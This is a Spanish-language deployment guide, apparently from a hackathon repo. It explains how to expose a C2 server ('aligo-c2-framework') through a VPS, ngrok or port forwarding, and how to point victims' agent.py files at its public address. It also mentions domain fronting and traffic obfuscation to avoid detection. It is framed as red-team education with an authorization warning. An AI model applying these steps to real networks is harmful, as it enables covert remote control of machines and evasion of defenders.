# 🌍 Despliegue en Escenario Real

## Arquitectura Real de C2

En un escenario real, el servidor C2 está en internet (IP pública) y los agentes se conectan desde redes privadas/corporativas diferentes.

```
┌─────────────────┐         Internet        ┌──────────────────┐
│   Red Empresa A │ ─────────────────────▶ │  Servidor C2     │
│  (10.0.0.0/24)  │                        │  IP Pública      │
│                 │                        │  vps.ejemplo.com │
│  Agent-001      │                        │  Puerto: 4444    │
└─────────────────┘                        └──────────────────┘
                                                     ▲
                                                     │
┌─────────────────┐                                 │
│   Red Empresa B │ ────────────────────────────────┘
│ (192.168.1.0/24)│
│                 │
│  Agent-002      │
└─────────────────┘
```

---

## 🚀 Opción 1: VPS con IP Pública (Profesional)

### Proveedores recomendados:
- **DigitalOcean** - $5/mes, muy fácil
- **Linode** - $5/mes, buena performance
- **AWS EC2** - Capa gratuita 1 año
- **Google Cloud** - $300 créditos gratis
- **Vultr** - $2.50/mes (más barato)

### Pasos:

#### 1. Crear VPS
```bash
# Crear un servidor Linux (Ubuntu 22.04 o Debian)
# Tamaño mínimo: 1GB RAM, 1 CPU
# Obtener IP pública: ej. 104.248.123.45
```

#### 2. Configurar el VPS
```bash
# SSH al servidor
ssh root@104.248.123.45

# Instalar Python 3
apt update
apt install python3 python3-pip git -y

# Clonar el repo
git clone https://github.com/tu-equipo/aligo-c2-framework.git
cd aligo-c2-framework/server

# Configurar firewall (permitir puerto 4444)
ufw allow 4444/tcp
ufw allow 22/tcp  # SSH
ufw enable
```

#### 3. Ejecutar el servidor
```bash
cd /root/aligo-c2-framework/server
python3 server.py
```

#### 4. Configurar agentes
```python
# En agent.py de las víctimas:
SERVER_HOST = "104.248.123.45"  # IP pública del VPS
SERVER_PORT = 4444
```

### Ventajas:
✅ **Realista** - Así funcionan los C2 reales
✅ **Alcance global** - Agentes desde cualquier parte del mundo
✅ **No depende de tu red local**
✅ **Persistente** - El servidor siempre está arriba

### Desventajas:
❌ Costo mensual ($2-5/mes mínimo)
❌ Requiere configuración de servidor
❌ Responsabilidad de seguridad

---

## 🔄 Opción 2: ngrok (Gratis, Rápido, Para Demos)

Convierte tu localhost en una URL pública temporal.

### Pasos:

#### 1. Instalar ngrok
```bash
# En tu laptop (servidor)
sudo snap install ngrok
# O descarga: https://ngrok.com/download
```

#### 2. Iniciar servidor local
```bash
cd /home/jose/ArchivoPortable/Hackatonn/aligo-c2-framework/server
python3 server.py
```

#### 3. Crear túnel público
```bash
# En otra terminal
ngrok tcp 4444
```

Verás algo como:
```
Forwarding: tcp://4.tcp.ngrok.io:15432 -> localhost:4444
```

#### 4. Configurar agentes
```python
# En agent.py:
SERVER_HOST = "4.tcp.ngrok.io"  # Host de ngrok
SERVER_PORT = 15432              # Puerto de ngrok
```

### Ventajas:
✅ **Gratis** - Plan gratuito disponible
✅ **Rápido** - Setup en 2 minutos
✅ **No requiere VPS**
✅ **Funciona desde cualquier red**

### Desventajas:
❌ URL cambia cada vez que reinicias
❌ Sesiones de 2 horas (plan gratis)
❌ Puede ser lento
❌ Requiere que tu laptop esté prendida

---

## 🔀 Opción 3: Port Forwarding (Si tienes acceso al router)

Si tienes control del router donde está el servidor.

### Pasos:

#### 1. Obtener IP privada del servidor
```bash
hostname -I | awk '{print $1}'
# Ej: 192.168.1.100
```

#### 2. Configurar Port Forwarding en el router
```
Router → Port Forwarding → Agregar regla:
- Puerto Externo: 4444
- Puerto Interno: 4444
- IP Interna: 192.168.1.100
- Protocolo: TCP
```

#### 3. Obtener IP pública del router
```bash
curl ifconfig.me
# Ej: 203.0.113.45
```

#### 4. Configurar agentes
```python
SERVER_HOST = "203.0.113.45"  # IP pública del router
SERVER_PORT = 4444
```

### Ventajas:
✅ Gratis
✅ No depende de terceros
✅ Control total

### Desventajas:
❌ IP pública puede cambiar (requiere DNS dinámico)
❌ Requiere acceso al router
❌ Expone tu red doméstica
❌ No recomendado para producción

---

## 🎯 Recomendaciones por Escenario

### Para el Hackathon (Demo de 1-2 días):
**Usa ngrok** ✅
- Gratis, rápido, fácil
- Perfecto para demostraciones
- No necesitas configurar nada extra

### Para Desarrollo/Testing (Semanas):
**Usa VPS Barato** ✅
- Vultr ($2.50/mes) o DigitalOcean ($5/mes)
- Más estable que ngrok
- Aprenderás sobre despliegue real

### Para Producción (Red Team Real):
**Usa VPS Profesional con Dominio** ✅
- AWS/DigitalOcean con dominio propio
- SSL/TLS para cifrado
- Ofuscación y anti-detección

---

## 🛡️ Mejoras de Seguridad (Opcional)

### 1. Cifrado SSL/TLS
```python
# Usar SSL para cifrar comunicaciones
import ssl
```

### 2. Autenticación
```python
# Agregar token de autenticación
AUTH_TOKEN = "secreto-compartido-2024"
```

### 3. Ofuscación de Tráfico
```python
# Usar HTTP/HTTPS en lugar de TCP puro
# Simular tráfico legítimo
```

### 4. Domain Fronting
```python
# Usar dominios legítimos como CDN
# Para evitar detección
```

---

## 📋 Checklist para Demo Realista

- [ ] Servidor en VPS/ngrok (no localhost)
- [ ] Agentes en diferentes redes WiFi
- [ ] Firewall configurado en servidor
- [ ] Agentes con IP pública del servidor
- [ ] Test de conectividad desde redes externas
- [ ] Documentar latencia y tiempos de respuesta
- [ ] Plan B si falla la conexión (usar localhost como backup)

---

## 🚨 Consideraciones Éticas

⚠️ **IMPORTANTE:** 
- Solo usa en entornos autorizados
- Obtén permiso por escrito antes de desplegar
- No uses en redes/sistemas sin autorización
- Este es un proyecto educativo

---

## 🎓 Para el Hackathon - Mi Recomendación

**Plan Principal:** ngrok
```bash
# Terminal 1: Servidor
python3 server.py

# Terminal 2: Túnel
ngrok tcp 4444
```

**Plan Backup:** Red local de universidad
```bash
# Si ngrok falla, usar IP local
hostname -I
```

Esto te da **flexibilidad** y es **fácil de configurar** durante la competencia.
